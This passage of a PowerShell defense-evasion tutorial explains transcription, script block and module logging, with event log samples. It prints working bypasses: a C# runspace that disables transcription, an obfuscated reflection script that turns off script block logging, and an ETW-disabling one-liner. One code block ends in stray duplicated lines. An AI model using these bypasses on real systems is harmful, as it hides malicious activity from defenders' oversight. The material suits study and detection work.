class=\"keyword\">using</span> System.Management.Automation.Runspaces;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title\">Program</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>(<span class=\"params\"><span class=\"built_in\">string</span>[] <span class=\"keyword\">args</span></span>)</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Create a default runspace</span></span><br><span class=\"line\">        <span class=\"keyword\">using</span> (Runspace runspace = RunspaceFactory.CreateRunspace())</span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            runspace.Open();</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// Create a pipeline</span></span><br><span class=\"line\">            <span class=\"keyword\">using</span> (Pipeline pipeline = runspace.CreatePipeline())</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                <span class=\"comment\">// Add the command to print &quot;Hello World&quot;</span></span><br><span class=\"line\">                pipeline.Commands.AddScript(<span class=\"string\">&quot;Write-Output &#x27;Hello World&#x27;&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">// Execute the pipeline and get results</span></span><br><span class=\"line\">                <span class=\"keyword\">var</span> results = pipeline.Invoke();</span><br><span class=\"line\"></span><br><span class=\"line\">                <span class=\"comment\">// Display results</span></span><br><span class=\"line\">                <span class=\"keyword\">foreach</span> (PSObject result <span class=\"keyword\">in</span> results)</span><br><span class=\"line\">                &#123;</span><br><span class=\"line\">                    Console.WriteLine(result.ToString());</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            runspace.Close();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            rs.Close();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// Hello_Bypass.cs # https://avantguard.io/en/blog/powershell-enhanced-logging-capabilities-bypass</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">using</span> System;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Reflection;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Management.Automation;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Management.Automation.Runspaces;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Collections.Concurrent;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Collections.Generic;</span><br><span class=\"line\"><span class=\"keyword\">using</span> System.Collections.ObjectModel;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">namespace</span> <span class=\"title\">CustomRunspace</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    <span class=\"keyword\">class</span> <span class=\"title\">CustomRunspace</span></span><br><span class=\"line\">    &#123;</span><br><span class=\"line\">        <span class=\"function\"><span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">Main</span>(<span class=\"params\"><span class=\"built_in\">string</span>[] <span class=\"keyword\">args</span></span>)</span></span><br><span class=\"line\">        &#123;</span><br><span class=\"line\">            Runspace rs = RunspaceFactory.CreateRunspace();</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// Transcription Logging Bypass</span></span><br><span class=\"line\">            BindingFlags bf = BindingFlags.NonPublic | BindingFlags.Static;</span><br><span class=\"line\">            ConcurrentDictionary&lt;<span class=\"built_in\">string</span>, Dictionary&lt;<span class=\"built_in\">string</span>, <span class=\"built_in\">object</span>&gt;&gt; <span class=\"keyword\">value</span> = (ConcurrentDictionary&lt;<span class=\"built_in\">string</span>, Dictionary&lt;<span class=\"built_in\">string</span>, <span class=\"built_in\">object</span>&gt;&gt;)rs.GetType().Assembly.GetType(<span class=\"string\">&quot;System.Management.Automation.Utils&quot;</span>).GetField(<span class=\"string\">&quot;cachedGroupPolicySettings&quot;</span>, bf).GetValue(<span class=\"literal\">null</span>);</span><br><span class=\"line\">            Dictionary&lt;<span class=\"built_in\">string</span>, <span class=\"built_in\">object</span>&gt; dic = <span class=\"keyword\">new</span> Dictionary&lt;<span class=\"built_in\">string</span>, <span class=\"built_in\">object</span>&gt;();</span><br><span class=\"line\">            dic.Add(<span class=\"string\">&quot;EnableTranscripting&quot;</span>, <span class=\"string\">&quot;0&quot;</span>);</span><br><span class=\"line\">            <span class=\"keyword\">value</span>.GetOrAdd(<span class=\"string\">&quot;HKEY_LOCAL_MACHINE\\\\Software\\\\Policies\\\\Microsoft\\\\Windows\\\\PowerShell\\\\Transcription&quot;</span>, dic);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"comment\">// Open Runspace</span></span><br><span class=\"line\">            rs.Open();</span><br><span class=\"line\"></span><br><span class=\"line\">            PowerShell ps = PowerShell.Create();</span><br><span class=\"line\">            ps.Runspace = rs;</span><br><span class=\"line\">            ps.AddCommand(<span class=\"string\">&quot;Write-Output&quot;</span>).AddArgument(<span class=\"string\">&quot;Hello World&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            Collection&lt;PSObject&gt; results = ps.Invoke();</span><br><span class=\"line\">            <span class=\"keyword\">foreach</span> (<span class=\"keyword\">var</span> result <span class=\"keyword\">in</span> results)</span><br><span class=\"line\">            &#123;</span><br><span class=\"line\">                Console.WriteLine(result);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">            rs.Close();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<ul>\n<li>Runspace (short for ‚Äúruntime space‚Äù) is an <strong>isolated execution</strong> environment in PowerShell that encapsulates the state and configuration needed to run PowerShell commands or scripts. <strong>It includes session state</strong> (e.g., variables, functions, modules), the PowerShell engine, and the host interface for input&#x2F;output so it allow PowerShell to execute commands in a controlled, isolated manner, supporting both interactive sessions (like powershell.exe) and programmatic execution</li>\n<li>you can compile the cs files with this command :</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">C:\\Windows\\Microsoft.NET\\Framework64\\v4.<span class=\"number\">0.30319</span>\\csc.exe /reference:<span class=\"string\">&quot;C:\\Windows\\Microsoft.NET\\assembly\\GAC_MSIL\\System.Management.Automation\\v4.0_3.0.0.0__31bf3856ad364e35\\System.Management.Automation.dll&quot;</span> /out:Transcription_Bypass.exe CustomRunspace.cs</span><br></pre></td></tr></table></figure><p>{: .prompt-tip }</p>\n</blockquote>\n<p>Let‚Äôs see what we can do</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def29.png\" alt=\"\"></figure>\n\n<p>So , When we run the hello_world executable the transcription loggin save the commands that in the c# script and the Transcription file created with 53504 Event-ID</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span>?&gt;</span><br><span class=\"line\">- &lt;Event xmlns=<span class=\"string\">&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;</span>&gt;</span><br><span class=\"line\">- &lt;System&gt;</span><br><span class=\"line\">  &lt;Provider Name=<span class=\"string\">&quot;Microsoft-Windows-PowerShell&quot;</span> Guid=<span class=\"string\">&quot;&#123;a0c1853b-5c40-4b15-8766-3cf1c58f985a&#125;&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;EventID&gt;<span class=\"number\">53504</span>&lt;/EventID&gt; </span><br><span class=\"line\">  &lt;Version&gt;<span class=\"number\">1</span>&lt;/Version&gt; </span><br><span class=\"line\">  &lt;Level&gt;<span class=\"number\">4</span>&lt;/Level&gt; </span><br><span class=\"line\">  &lt;Task&gt;<span class=\"number\">111</span>&lt;/Task&gt; </span><br><span class=\"line\">  &lt;Opcode&gt;<span class=\"number\">10</span>&lt;/Opcode&gt; </span><br><span class=\"line\">  &lt;Keywords&gt;<span class=\"number\">0</span>x0&lt;/Keywords&gt; </span><br><span class=\"line\">  &lt;TimeCreated SystemTime=<span class=\"string\">&quot;2025-07-24T01:33:13.9730709Z&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;EventRecordID&gt;<span class=\"number\">57</span>&lt;/EventRecordID&gt; </span><br><span class=\"line\">  &lt;Correlation ActivityID=<span class=\"string\">&quot;&#123;3aa23c01-fc70-0000-906c-a23a70fcdb01&#125;&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;Execution ProcessID=<span class=\"string\">&quot;7140&quot;</span> ThreadID=<span class=\"string\">&quot;3408&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;Channel&gt;Microsoft<span class=\"literal\">-Windows-PowerShell</span>/Operational&lt;/Channel&gt; </span><br><span class=\"line\">  &lt;Computer&gt;DESKTOP<span class=\"literal\">-INN3ESD</span>&lt;/Computer&gt; </span><br><span class=\"line\">  &lt;Security UserID=<span class=\"string\">&quot;S-1-5-21-2346707970-763624724-545999952-1001&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;/System&gt;</span><br><span class=\"line\">- &lt;EventData&gt;</span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;param1&quot;</span>&gt;<span class=\"number\">7140</span>&lt;/<span class=\"keyword\">Data</span>&gt; </span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;param2&quot;</span>&gt;DefaultAppDomain&lt;/<span class=\"keyword\">Data</span>&gt; </span><br><span class=\"line\">  &lt;/EventData&gt;</span><br><span class=\"line\">  &lt;/Event&gt;</span><br></pre></td></tr></table></figure>\n\n<p>Let‚Äôs run the Bypass script with the same Hello_World function</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def30.png\" alt=\"\"></figure>\n\n<p>So, the difference here is that there is no log file. Because the new file runs the custom runspace without any transcription log file.</p>\n<h3 id=\"Script-Block-Logging\"><a href=\"#Script-Block-Logging\" class=\"headerlink\" title=\"Script Block Logging\"></a>Script Block Logging</h3><p>Records the code executed, including scripts, functions, and commands, whether invoked interactively or through automation.</p>\n<p>Let‚Äôs configure it from Local Group Policy -&gt; Administrative Templates -&gt; Windows Components -&gt; Windows PowerShell Then navigate to Powershell script block logging</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def31.png\" alt=\"\"></figure>\n\n<p>Let‚Äôs see how this work , you can run this script to know the Script block logging are on or not</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$scriptBlockLogging</span> = <span class=\"built_in\">Get-ItemProperty</span> <span class=\"literal\">-Path</span> <span class=\"string\">&quot;HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging&quot;</span> <span class=\"literal\">-ErrorAction</span> SilentlyContinue</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$scriptBlockLogging</span> <span class=\"operator\">-and</span> <span class=\"variable\">$scriptBlockLogging</span>.EnableScriptBlockLogging <span class=\"operator\">-eq</span> <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Script Block Logging is enabled.&quot;</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$scriptBlockLogging</span>.EnableScriptBlockInvocationLogging <span class=\"operator\">-eq</span> <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Script block invocation logging is also enabled.&quot;</span></span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Script block invocation logging is not enabled.&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Script Block Logging is not enabled.&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>let‚Äôs start and after that start enum the event‚Äôs with</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Get-WinEvent</span> <span class=\"literal\">-LogName</span> <span class=\"string\">&quot;Microsoft-Windows-PowerShell/Operational&quot;</span> <span class=\"literal\">-MaxEvents</span> <span class=\"number\">100</span> | <span class=\"built_in\">Where-Object</span> &#123; <span class=\"variable\">$_</span>.Id <span class=\"operator\">-eq</span> <span class=\"number\">4104</span> &#125; | <span class=\"built_in\">Select-Object</span> TimeCreated, <span class=\"selector-tag\">@</span>&#123;Name=<span class=\"string\">&quot;ScriptBlock&quot;</span>;Expression=&#123;<span class=\"variable\">$_</span>.Properties[<span class=\"number\">2</span>].Value&#125;&#125; | <span class=\"built_in\">Format-List</span></span><br></pre></td></tr></table></figure>\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def32.png\" alt=\"\"></figure>\n\n<blockquote>\n<ul>\n<li><p>The Script block get the script content not only the input and the output in the prompt</p>\n</li>\n<li><p><a href=\"https://www.robwillis.info/2019/10/everything-you-need-to-know-to-get-started-logging-powershell\">PowerShell 5.0 auto logging</a> : By default, PowerShell does not log everything and to get the most out of the logging capabilities there are additional policies that need to be enabled. However, it is worth noting that starting with PowerShell 5.0, anything that is determined as <em><strong>suspicious</strong></em> by AMSI (Antimalware Scan Interface), will automatically log a Script block&#x2F;4104 event with a level of <em><strong>Warning</strong></em>. <a href=\"https://web.archive.org/web/20180827195417/https://cobbr.io/ScriptBlock-Warning-Event-Logging-Bypass.html\">If script block logging is explicitly disabled, these events will not be logged.</a><br>{: .prompt-info }</p>\n</li>\n</ul>\n</blockquote>\n<h4 id=\"ScriptBlock-Bypass\"><a href=\"#ScriptBlock-Bypass\" class=\"headerlink\" title=\"ScriptBlock Bypass\"></a>ScriptBlock Bypass</h4><p>Like the previous bypasses , The user can change his powershell session evniroments and the cached setting so <a href=\"https://web.archive.org/web/20190417131155/https://cobbr.io/ScriptBlock-Logging-Bypass.html\">cobbr</a> notice that and made this <a href=\"https://gist.github.com/cobbr/d8072d730b24fbae6ffe3aed8ca9c407\">script</a> for us to disable the scriptblock logging</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$GroupPolicyField</span> = [<span class=\"type\">ref</span>].Assembly.GetType(<span class=\"string\">&#x27;System.Management.Automation.Utils&#x27;</span>).<span class=\"string\">&quot;GetFie`ld&quot;</span>(<span class=\"string\">&#x27;cachedGroupPolicySettings&#x27;</span>, <span class=\"string\">&#x27;N&#x27;</span>+<span class=\"string\">&#x27;onPublic,Static&#x27;</span>)</span><br><span class=\"line\"><span class=\"keyword\">If</span> (<span class=\"variable\">$GroupPolicyField</span>) &#123;</span><br><span class=\"line\">    <span class=\"variable\">$GroupPolicyCache</span> = <span class=\"variable\">$GroupPolicyField</span>.GetValue(<span class=\"variable\">$null</span>)</span><br><span class=\"line\">    <span class=\"keyword\">If</span> (<span class=\"variable\">$GroupPolicyCache</span>[<span class=\"string\">&#x27;ScriptB&#x27;</span>+<span class=\"string\">&#x27;lockLogging&#x27;</span>]) &#123;</span><br><span class=\"line\">        <span class=\"variable\">$GroupPolicyCache</span>[<span class=\"string\">&#x27;ScriptB&#x27;</span>+<span class=\"string\">&#x27;lockLogging&#x27;</span>][<span class=\"string\">&#x27;EnableScriptB&#x27;</span>+<span class=\"string\">&#x27;lockLogging&#x27;</span>] = <span class=\"number\">0</span></span><br><span class=\"line\">        <span class=\"variable\">$GroupPolicyCache</span>[<span class=\"string\">&#x27;ScriptB&#x27;</span>+<span class=\"string\">&#x27;lockLogging&#x27;</span>][<span class=\"string\">&#x27;EnableScriptBlockInvocationLogging&#x27;</span>] = <span class=\"number\">0</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"variable\">$val</span> = [<span class=\"type\">System.Collections.Generic.Dictionary</span>[<span class=\"built_in\">string</span>,<span class=\"type\">System.Object</span>]]::new()</span><br><span class=\"line\">    <span class=\"variable\">$val</span>.Add(<span class=\"string\">&#x27;EnableScriptB&#x27;</span>+<span class=\"string\">&#x27;lockLogging&#x27;</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"variable\">$val</span>.Add(<span class=\"string\">&#x27;EnableScriptB&#x27;</span>+<span class=\"string\">&#x27;lockInvocationLogging&#x27;</span>, <span class=\"number\">0</span>)</span><br><span class=\"line\">    <span class=\"variable\">$GroupPolicyCache</span>[<span class=\"string\">&#x27;HKEY_LOCAL_MACHINE\\Software\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptB&#x27;</span>+<span class=\"string\">&#x27;lockLogging&#x27;</span>] = <span class=\"variable\">$val</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>Then test it with the count of the logs</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Get-WinEvent</span> <span class=\"literal\">-FilterHashtable</span> <span class=\"selector-tag\">@</span>&#123;ProviderName=<span class=\"string\">&quot;Microsoft-Windows-PowerShell&quot;</span>; Id=<span class=\"number\">4104</span>&#125; | <span class=\"built_in\">Measure</span> | % Count</span><br></pre></td></tr></table></figure>\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def33.png\" alt=\"\"></figure>\n\n<blockquote>\n<p>Our bypass script will still being logged cuz of <a href=\"https://www.ired.team/miscellaneous-reversing-forensics/windows-kernel-internals/etw-event-tracing-for-windows-101\">Event Tracing for Windows</a> you can use this <a href=\"https://gist.github.com/tandasat/e595c77c52e13aaee60e1e8b65d2ba32\">script here</a> to disable it</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">[<span class=\"type\">Reflection.Assembly</span>]::LoadWithPartialName(<span class=\"string\">&#x27;System.Core&#x27;</span>).GetType(<span class=\"string\">&#x27;System.Diagnostics.Eventing.EventProvider&#x27;</span>).GetField(<span class=\"string\">&#x27;m_enabled&#x27;</span>,<span class=\"string\">&#x27;NonPublic,Instance&#x27;</span>).SetValue([<span class=\"type\">Ref</span>].Assembly.GetType(<span class=\"string\">&#x27;System.Management.Automation.Tracing.PSEtwLogProvider&#x27;</span>).GetField(<span class=\"string\">&#x27;etwProvider&#x27;</span>,<span class=\"string\">&#x27;NonPublic,Static&#x27;</span>).GetValue(<span class=\"variable\">$null</span>),<span class=\"number\">0</span>)</span><br></pre></td></tr></table></figure><p>{: .prompt-tip }</p>\n</blockquote>\n<h3 id=\"Module-Logging\"><a href=\"#Module-Logging\" class=\"headerlink\" title=\"Module Logging\"></a>Module Logging</h3><p>Records pipeline execution details for <span style=\"color:yellow\">cmdlets from specified modules</span>, including variable initialization and command invocations.</p>\n<p>Let‚Äôs configure it from Local Group Policy -&gt; Administrative Templates -&gt; Windows Components -&gt; Windows PowerShell Then navigate to Module logging</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def34.png\" alt=\"\"></figure>\n\n<p>Let‚Äôs see how this work , you can run this script to know the Module logging are on or not</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$moduleLogging</span> = <span class=\"built_in\">Get-ItemProperty</span> <span class=\"literal\">-Path</span> <span class=\"string\">&quot;HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging&quot;</span> <span class=\"literal\">-ErrorAction</span> SilentlyContinue</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"variable\">$moduleLogging</span> <span class=\"operator\">-and</span> <span class=\"variable\">$moduleLogging</span>.EnableModuleLogging <span class=\"operator\">-eq</span> <span class=\"number\">1</span>) &#123;</span><br><span class=\"line\">    <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Module Logging is enabled.&quot;</span></span><br><span class=\"line\">    <span class=\"variable\">$moduleNames</span> = <span class=\"built_in\">Get-ItemProperty</span> <span class=\"literal\">-Path</span> <span class=\"string\">&quot;HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\\ModuleNames&quot;</span> <span class=\"literal\">-ErrorAction</span> SilentlyContinue</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (<span class=\"variable\">$moduleNames</span>) &#123;</span><br><span class=\"line\">        <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Modules being logged:&quot;</span></span><br><span class=\"line\">        <span class=\"variable\">$moduleNames</span>.PSObject.Properties | <span class=\"built_in\">Where-Object</span> &#123; <span class=\"variable\">$_</span>.Name <span class=\"operator\">-ne</span> <span class=\"string\">&#x27;PSPath&#x27;</span> <span class=\"operator\">-and</span> <span class=\"variable\">$_</span>.Name <span class=\"operator\">-ne</span> <span class=\"string\">&#x27;PSParentPath&#x27;</span> &#125; | <span class=\"built_in\">ForEach-Object</span> &#123;</span><br><span class=\"line\">            <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot; - <span class=\"variable\">$</span>(<span class=\"variable\">$_</span>.Name) = <span class=\"variable\">$</span>(<span class=\"variable\">$_</span>.Value)&quot;</span></span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;No specific modules are configured for logging.&quot;</span></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">Write-Host</span> <span class=\"string\">&quot;Module Logging is not enabled.&quot;</span></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>let‚Äôs start and after that start enum the event‚Äôs with</p>\n```<table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"built_in\">Get-WinEvent</span> <span class=\"literal\">-LogName</span> <span class=\"string\">&quot;Microsoft-Windows-PowerShell/Operational&quot;</span> <span class=\"literal\">-MaxEvents</span> <span class=\"number\">100</span> | <span class=\"built_in\">Where-Object</span> &#123; <span class=\"variable\">$_</span>.Id <span class=\"operator\">-eq</span> <span class=\"number\">4103</span> &#125; | <span class=\"built_in\">Select-Object</span> TimeCreated, <span class=\"selector-tag\">@</span>&#123;Name=<span class=\"string\">&quot;Command&quot;</span>;Expression=&#123;<span class=\"variable\">$_</span>.Properties[<span class=\"number\">1</span>].Value&#125;&#125;, <span class=\"selector-tag\">@</span>&#123;Name=<span class=\"string\">&quot;Module&quot;</span>;Expression=&#123;<span class=\"variable\">$_</span>.Properties[<span class=\"number\">0</span>].Value&#125;&#125; | <span class=\"built_in\">Format-List</span></span><br></pre></td></tr></table></figure>\n\n<figure><img src=\"/images/site/posts/DefenseEvasion/def35.png\" alt=\"\"></figure>\n\n\n\n<h4 id=\"Module-Logging-Bypass\"><a href=\"#Module-Logging-Bypass\" class=\"headerlink\" title=\"Module Logging Bypass\"></a>Module Logging Bypass</h4><p>Let‚Äôs start with a simple event like print a string with write-host</p>\n<figure><img src=\"/images/site/posts/DefenseEvasion/def36.png\" alt=\"\"></figure>\n\n\n<p>This simple command trigger 4 events let‚Äôs discribe them</p>\n<ul>\n<li>PSConsoleHostReadLine : This log appears when you enter the command, as the PSReadLine module handles input reading, providing features like auto-completion and syntax highlighting.</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span>?&gt;</span><br><span class=\"line\">- &lt;Event xmlns=<span class=\"string\">&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;</span>&gt;</span><br><span class=\"line\">- &lt;System&gt;</span><br><span class=\"line\">  &lt;Provider Name=<span class=\"string\">&quot;Microsoft-Windows-PowerShell&quot;</span> Guid=<span class=\"string\">&quot;&#123;a0c1853b-5c40-4b15-8766-3cf1c58f985a&#125;&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;EventID&gt;<span class=\"number\">4103</span>&lt;/EventID&gt; </span><br><span class=\"line\">  &lt;Version&gt;<span class=\"number\">1</span>&lt;/Version&gt; </span><br><span class=\"line\">  &lt;Level&gt;<span class=\"number\">4</span>&lt;/Level&gt; </span><br><span class=\"line\">  &lt;Task&gt;<span class=\"number\">106</span>&lt;/Task&gt; </span><br><span class=\"line\">  &lt;Opcode&gt;<span class=\"number\">20</span>&lt;/Opcode&gt; </span><br><span class=\"line\">  &lt;Keywords&gt;<span class=\"number\">0</span>x0&lt;/Keywords&gt; </span><br><span class=\"line\">  &lt;TimeCreated SystemTime=<span class=\"string\">&quot;2025-07-20T23:17:27.8187082Z&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;EventRecordID&gt;<span class=\"number\">285</span>&lt;/EventRecordID&gt; </span><br><span class=\"line\">  &lt;Correlation ActivityID=<span class=\"string\">&quot;&#123;188710b5-f9b6-0000-6a3a-8718b6f9db01&#125;&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;Execution ProcessID=<span class=\"string\">&quot;2236&quot;</span> ThreadID=<span class=\"string\">&quot;7736&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;Channel&gt;Microsoft<span class=\"literal\">-Windows-PowerShell</span>/Operational&lt;/Channel&gt; </span><br><span class=\"line\">  &lt;Computer&gt;DESKTOP<span class=\"literal\">-47K3P38</span>&lt;/Computer&gt; </span><br><span class=\"line\">  &lt;Security UserID=<span class=\"string\">&quot;S-1-5-21-3540393959-771636146-431249527-1001&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;/System&gt;</span><br><span class=\"line\">- &lt;EventData&gt;</span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;ContextInfo&quot;</span>&gt;Severity = Informational Host Name = ConsoleHost Host Version = <span class=\"number\">5.1</span>.<span class=\"number\">19041.2673</span> Host ID = <span class=\"number\">80</span>aae10f<span class=\"literal\">-5d8d-48fd-ad14-389df84528c7</span> Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.<span class=\"number\">0</span>\\powershell.exe Engine Version = <span class=\"number\">5.1</span>.<span class=\"number\">19041.2673</span> Runspace ID = c5b9897e<span class=\"literal\">-6c29-42d0-a784-bc369f276c7e</span> Pipeline ID = <span class=\"number\">17</span> Command Name = PSConsoleHostReadLine Command <span class=\"built_in\">Type</span> = <span class=\"function\"><span class=\"keyword\">Function</span> <span class=\"title\">Script</span> <span class=\"title\">Name</span> = <span class=\"title\">Command</span> <span class=\"title\">Path</span> = <span class=\"title\">Sequence</span> <span class=\"title\">Number</span> = <span class=\"title\">46</span> <span class=\"title\">User</span> = <span class=\"title\">DESKTOP-47K3P38</span>\\<span class=\"title\">3atef</span> <span class=\"title\">Connected</span> <span class=\"title\">User</span> = <span class=\"title\">Shell</span> <span class=\"title\">ID</span> = <span class=\"title\">Microsoft</span>.<span class=\"title\">PowerShell</span>&lt;/<span class=\"title\">Data</span>&gt; </span></span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;UserData&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;<span class=\"keyword\">Data</span> Name=<span class=\"string\">&quot;Payload&quot;</span>&gt;CommandInvocation(PSConsoleHostReadLine): <span class=\"string\">&quot;PSConsoleHostReadLine&quot;</span>&lt;/<span class=\"keyword\">Data</span>&gt; </span><br><span class=\"line\">  &lt;/EventData&gt;</span><br><span class=\"line\">  &lt;/Event&gt;</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>Write-Host : This directly logs the command you executed, showing the invocation and the parameter ‚Äú@N1NJ10 was here‚Äù.</li>\n</ul>\n```<table><tr><td class=\"code\"><pre><span class=\"line\">&lt;?xml version=<span class=\"string\">&quot;1.0&quot;</span>?&gt;</span><br><span class=\"line\">- &lt;Event xmlns=<span class=\"string\">&quot;http://schemas.microsoft.com/win/2004/08/events/event&quot;</span>&gt;</span><br><span class=\"line\">- &lt;System&gt;</span><br><span class=\"line\">  &lt;Provider Name=<span class=\"string\">&quot;Microsoft-Windows-PowerShell&quot;</span> Guid=<span class=\"string\">&quot;&#123;a0c1853b-5c40-4b15-8766-3cf1c58f985a&#125;&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;EventID&gt;<span class=\"number\">4103</span>&lt;/EventID&gt; </span><br><span class=\"line\">  &lt;Version&gt;<span class=\"number\">1</span>&lt;/Version&gt; </span><br><span class=\"line\">  &lt;Level&gt;<span class=\"number\">4</span>&lt;/Level&gt; </span><br><span class=\"line\">  &lt;Task&gt;<span class=\"number\">106</span>&lt;/Task&gt; </span><br><span class=\"line\">  &lt;Opcode&gt;<span class=\"number\">20</span>&lt;/Opcode&gt; </span><br><span class=\"line\">  &lt;Keywords&gt;<span class=\"number\">0</span>x0&lt;/Keywords&gt; </span><br><span class=\"line\">  &lt;TimeCreated SystemTime=<span class=\"string\">&quot;2025-07-20T23:17:27.8234848Z&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;EventRecordID&gt;<span class=\"number\">286</span>&lt;/EventRecordID&gt; </span><br><span class=\"line\">  &lt;Correlation ActivityID=<span class=\"string\">&quot;&#123;188710b5-f9b6-0002-d13b-8718b6f9db01&#125;&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;Execution ProcessID=<span class=\"string\">&quot;2236&quot;</span> ThreadID=<span class=\"string\">&quot;7736&quot;</span> /&gt; </span><br><span class=\"line\">  &lt;Channel&gt;Microsoft<span class=\"literal\">-Windows-PowerShell</span>/Operational&lt;/Channel&gt; </span><br><span class=\"line\">  &lt;Computer&gt;DESKTOP<span class=\"literal\">-47K3P38</span>&lt;/Computer&gt; </span><br><span class=\"line\">  &lt;Security 